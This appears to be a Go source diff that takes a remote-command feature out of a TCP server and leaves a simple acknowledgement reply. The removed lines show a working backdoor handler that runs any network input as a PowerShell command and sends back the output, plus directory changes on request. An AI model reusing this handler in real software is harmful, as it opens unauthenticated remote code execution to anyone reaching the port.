@@ -4,8 +4,6 @@ import (
 	"fmt"
 	"net"
 	"os"
-	"os/exec"
-	"strings"
 )
 
 const (
@@ -39,40 +37,14 @@ func main() {
 // Handles incoming requests.
 func handleRequest(conn net.Conn) {
 	// Make a buffer to hold incoming data.
-	buf := make([]byte, 8192)
+	buf := make([]byte, 1024)
 	// Read the incoming connection into the buffer.
 	_, err := conn.Read(buf)
 	if err != nil {
 		fmt.Println("Error reading:", err.Error())
 	}
-	bufString := ""
-	for _, v := range buf {
-		if v != 0 {
-			bufString = bufString + string(v)
-		}
-	}
-	if buf[0] == 'c' && buf[1] == 'd' {
-		splits := strings.Split(bufString, " ")
-		// fmt.Println(splits[1])
-		dir := strings.TrimSpace(splits[1])
-		err := os.Chdir(dir)
-		if err != nil {
-			fmt.Println("Error changing directory", err.Error())
-			conn.Write([]byte("Error changing directory " + err.Error()))
-		}
-		wd, _ := os.Getwd()
-		conn.Write([]byte("directory changed to " + wd))
-	} else {
-		cmd := exec.Command("powershell", bufString)
-		output, err := cmd.CombinedOutput()
-		if err != nil {
-			fmt.Println(fmt.Sprint(err) + ": " + string(output))
-			conn.Write([]byte("error"))
-			return
-		}
-		fmt.Println(string(output))
-		conn.Write(output)
-	}
+	// Send a response back to person contacting us.
+	conn.Write([]byte("Message received."))
 	// Close the connection when you're done with it.
 	conn.Close()
 }
